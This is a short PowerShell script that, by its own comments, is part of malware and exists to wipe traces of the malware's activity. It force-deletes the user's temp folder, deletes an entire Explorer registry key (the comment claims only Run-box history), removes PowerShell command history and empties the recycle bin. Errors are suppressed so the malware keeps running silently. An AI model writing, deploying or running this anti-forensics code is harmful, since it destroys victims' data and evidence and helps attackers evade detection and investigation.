#This script will delete any trace of the malware or its activity 

function Clean-traces {
    # Emptying the temp folder
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
    # This also states that is any error occurs then the malware will continue to execute silently without prompting any error to the user.

    #delete the run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer
    #this registry key stores the history of the currenty user history iknside the run box

    #Delete the powershell history
    Remove-Item (Get-PSReadLineOption).HistorySavePath

    #Empty the recycle bin just for fun
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    #If any error occurs during deletion of the recycle bin then the malware continues its other actitivities silently.
    
    
}